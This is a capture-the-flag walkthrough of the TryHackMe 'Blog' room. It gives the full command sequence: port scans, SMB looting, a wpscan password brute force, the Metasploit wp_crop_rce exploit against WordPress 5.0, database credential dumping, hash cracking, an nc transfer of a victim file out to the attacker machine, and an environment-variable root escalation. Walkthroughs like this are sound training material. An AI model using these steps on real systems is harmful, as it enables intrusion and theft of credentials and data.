# Blog

**Room Link:** [https://tryhackme.com/room/blog](https://tryhackme.com/room/blog)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>



## TCP/445 - SMB

**Kali**

```
smbclient -L //$VICTIM/
```

<figure><img src="../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
smbclient //$VICTIM/BillySMB
```

<figure><img src="../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
smbget -R smb://$VICTIM/BillySMB
```

<figure><img src="../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide extract -sf check-this.png 
cat rabbit_hole.txt 
```

<figure><img src="../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

If you go to http://$VICTIM/wp-admin the page redirects to a new page so I add blog.thm into my hosts file and then it worked.

<figure><img src="../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wpscan --url http://blog.thm/ --enumerate u
```

<figure><img src="../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

Hydra was taking too long but wpscan was able to find it quickly.

**Kali**

```
wpscan --url http://blog.thm/ -U kwheel, bjoel -P /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

After logging in the user couldn't really do anything but I noticed wordpress is on version 5.0

<figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>







## Initial Shell

**Kali**

```
msfconsole
use exploit/multi/http/wp_crop_rce
set rhosts $VICTIM
set username kwheel
set password cutiepie1
run
shell
python2 -c 'import pty; pty.spawn("/bin/bash")'
id
```

<figure><img src="../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
grep -i pass *
```

<figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
mysql -u wordpressuser -p
Password: LittleYellowLamp90!@
show databases;
use blog;
show tables;
select * from wp_users;
```

<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>



Tried brute forcing the hashes, we got the password for kwheel again but they aren't a user on the actual server. bjoel I wasn't able to bruteforce.

**Kali**

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

Found a pdf in bjoels home directory, after opening it up it looks like he was fired so his account is most likely locked anyways so there may be no point trying to break into it.

**Kali(receiving)**

```
cd /home/bjoel
nc -l -p 1234 > Billy_Joel_Termination_May20-2020.pdf
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < Billy_Joel_Termination_May20-2020.pdf
```

<figure><img src="../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**

**Victim**

```
find / -perm -u=s -type f 2> /dev/null 
```

<figure><img src="../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

This script seems to just check if there is a admin environment variable is set, if it isn't it will exit.

**Victim**

```
cd /usr/sbin
ltrace checker
```

<figure><img src="../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

I add the admin environment variable then right away I got root after running the script

**Victim**

```
env
export admin=admin
env
/usr/sbin/checker
```

<figure><img src="../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>
